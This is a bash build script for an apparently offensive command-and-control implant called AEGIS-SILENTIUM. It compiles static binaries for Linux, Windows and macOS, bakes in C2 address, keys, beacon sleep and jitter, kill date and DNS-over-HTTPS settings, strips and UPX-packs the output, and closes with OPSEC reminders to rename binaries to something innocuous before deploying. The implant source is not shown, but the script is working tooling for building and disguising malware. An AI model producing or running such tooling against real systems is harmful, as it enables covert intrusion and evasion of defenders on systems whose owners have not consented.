#!/usr/bin/env bash
# =============================================================================
# AEGIS-SILENTIUM Implant Build Script
# Produces static binaries for Linux (amd64/arm64) and Windows (amd64)
# Requires: Go 1.22+, gcc (for CGO), mingw-w64 (for Windows cross-compile)
# =============================================================================
set -euo pipefail

IMPLANT_DIR="$(cd "$(dirname "$0")/.." && pwd)/implant"
OUT_DIR="${1:-$(pwd)/build}"
VERSION="v1.0"

# ── Build-time injectable variables ──────────────────────────────────────────
C2_ADDRESS="${C2_ADDRESS:-https://127.0.0.1:8443}"
C2_PUBKEY="${C2_PUBKEY:-}"
PROFILE="${PROFILE:-default}"
SLEEP_SEC="${SLEEP_SEC:-60}"
JITTER_PCT="${JITTER_PCT:-20}"
KILL_DATE="${KILL_DATE:-}"
DNS_SERVER="${DNS_SERVER:-8.8.8.8:53}"
DOH_URL="${DOH_URL:-https://cloudflare-dns.com/dns-query}"
C2_DOMAIN="${C2_DOMAIN:-}"

LDFLAGS="-s -w \
  -X silentium-implant/config.C2Address=${C2_ADDRESS} \
  -X silentium-implant/config.C2Pubkey=${C2_PUBKEY} \
  -X silentium-implant/config.ProfileName=${PROFILE} \
  -X silentium-implant/config.SleepSec=${SLEEP_SEC} \
  -X silentium-implant/config.JitterPct=${JITTER_PCT} \
  -X silentium-implant/config.KillDate=${KILL_DATE} \
  -X silentium-implant/config.DNSServer=${DNS_SERVER} \
  -X silentium-implant/config.DoHURL=${DOH_URL} \
  -X silentium-implant/config.C2Domain=${C2_DOMAIN}"

mkdir -p "$OUT_DIR"

echo "[*] AEGIS-SILENTIUM Implant Build ${VERSION}"
echo "[*] Output: $OUT_DIR"
echo "[*] C2: $C2_ADDRESS | Profile: $PROFILE | Sleep: ${SLEEP_SEC}s ±${JITTER_PCT}%"
echo ""

# ── Linux amd64 (native CGO) ─────────────────────────────────────────────────
echo "[+] Building: linux/amd64 (CGO, static)"
cd "$IMPLANT_DIR"
CGO_ENABLED=1 \
GOOS=linux GOARCH=amd64 \
CC=gcc \
go build \
  -trimpath \
  -ldflags "${LDFLAGS} -extldflags '-static'" \
  -tags "osusergo netgo" \
  -o "$OUT_DIR/aegis-linux-amd64" \
  .
echo "[+] → $OUT_DIR/aegis-linux-amd64 ($(du -sh "$OUT_DIR/aegis-linux-amd64" | cut -f1))"

# ── Linux arm64 (cross-compile, CGO via aarch64 cross-compiler) ──────────────
if command -v aarch64-linux-gnu-gcc &>/dev/null; then
  echo "[+] Building: linux/arm64 (CGO cross, static)"
  CGO_ENABLED=1 \
  GOOS=linux GOARCH=arm64 \
  CC=aarch64-linux-gnu-gcc \
  go build \
    -trimpath \
    -ldflags "${LDFLAGS} -extldflags '-static'" \
    -tags "osusergo netgo" \
    -o "$OUT_DIR/aegis-linux-arm64" \
    .
  echo "[+] → $OUT_DIR/aegis-linux-arm64 ($(du -sh "$OUT_DIR/aegis-linux-arm64" | cut -f1))"
else
  echo "[-] Skipping linux/arm64 (aarch64-linux-gnu-gcc not found)"
fi

# ── Windows amd64 (cross-compile via mingw-w64) ───────────────────────────────
if command -v x86_64-w64-mingw32-gcc &>/dev/null; then
  echo "[+] Building: windows/amd64 (CGO cross, mingw)"
  CGO_ENABLED=1 \
  GOOS=windows GOARCH=amd64 \
  CC=x86_64-w64-mingw32-gcc \
  go build \
    -trimpath \
    -ldflags "${LDFLAGS}" \
    -o "$OUT_DIR/aegis-windows-amd64.exe" \
    .
  echo "[+] → $OUT_DIR/aegis-windows-amd64.exe ($(du -sh "$OUT_DIR/aegis-windows-amd64.exe" | cut -f1))"
else
  echo "[-] Skipping windows/amd64 (x86_64-w64-mingw32-gcc not found)"
  echo "    Install: apt-get install gcc-mingw-w64-x86-64"
fi

# ── macOS amd64 (if running on macOS) ────────────────────────────────────────
if [[ "$(uname)" == "Darwin" ]]; then
  echo "[+] Building: darwin/amd64"
  CGO_ENABLED=1 \
  GOOS=darwin GOARCH=amd64 \
  go build \
    -trimpath \
    -ldflags "${LDFLAGS}" \
    -o "$OUT_DIR/aegis-darwin-amd64" \
    .
  echo "[+] → $OUT_DIR/aegis-darwin-amd64"
fi

# ── Strip debug symbols further with strip ────────────────────────────────────
for f in "$OUT_DIR"/aegis-linux-*; do
  [ -f "$f" ] && strip "$f" 2>/dev/null && echo "[+] Stripped: $f"
done

# ── UPX compress (optional) ───────────────────────────────────────────────────
if command -v upx &>/dev/null && [[ "${UPX:-0}" == "1" ]]; then
  echo "[+] UPX compression..."
  for f in "$OUT_DIR"/aegis-*; do
    [[ "$f" != *.exe ]] && upx --best --lzma "$f" 2>/dev/null && echo "[+] UPX: $f"
  done
fi

echo ""
echo "[*] Build complete."
echo "[*] Artifacts:"
ls -lh "$OUT_DIR"/aegis-* 2>/dev/null || echo "  (none produced)"
echo ""
echo "[!] OPSEC reminder:"
echo "    - Set C2_ADDRESS, C2_PUBKEY, PROFILE, KILL_DATE before building for ops"
echo "    - Rename output binary to something innocuous before deploying"
echo "    - Run scripts/gen_keys.sh to generate relay keys if not done"
